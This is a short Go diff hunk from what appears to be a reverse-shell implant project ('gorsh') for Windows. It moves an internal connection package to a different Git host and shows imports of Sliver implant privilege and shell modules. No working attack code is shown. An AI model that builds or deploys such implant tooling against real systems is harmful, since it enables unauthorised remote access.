@@ -7,7 +7,7 @@ import (
 	"syscall"
 	"unsafe"
 
-	"git.hyrule.link/blink/gorsh/pkg/myconn"
+	"git.i.ctrl.red/blink/gorsh/pkg/myconn"
 	"github.com/bishopfox/sliver/implant/sliver/priv"
 	"github.com/bishopfox/sliver/implant/sliver/shell"
 	"golang.org/x/sys/windows"
